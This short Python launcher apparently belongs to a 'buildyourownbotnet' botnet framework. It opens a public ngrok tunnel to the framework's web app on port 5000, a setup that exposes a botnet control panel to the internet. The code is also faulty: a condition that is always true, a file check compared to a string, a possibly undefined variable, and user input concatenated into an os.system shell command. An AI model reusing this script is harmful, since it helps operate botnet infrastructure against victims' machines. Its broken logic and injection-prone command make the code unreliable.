from buildyourownbotnet import app
import os
import os.path
from pyngrok import ngrok
def find_files(filename, search_path):
   result = []

# Wlaking top-down from the root
   for root, dir, files in os.walk(search_path):
      if filename in files:
         result.append(os.path.join(root, filename))
   return result

print(find_files("smpl.htm","D:"))
c = input('Would you like to run with ngrok? [Y/n]')
if c == "y" or "Y" or "":
    if os.path.isfile('/root/.ngrok2/ngrok.yml') == "false":
        input("Go to 'https://dashboard.ngrok.com/signup' to get a ngrok api key. Then click ENTER.")
        print("Input your api key")
        api = input(">>>>")
        os.system("ngrok authtoken " + api)
    else:
        public_url = ngrok.connect(5000, "http")
else:
    print("Ok no ngrok for you then")
print(public_url + " is the ngrok url")

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=5000)
	#app.run(debug=True)
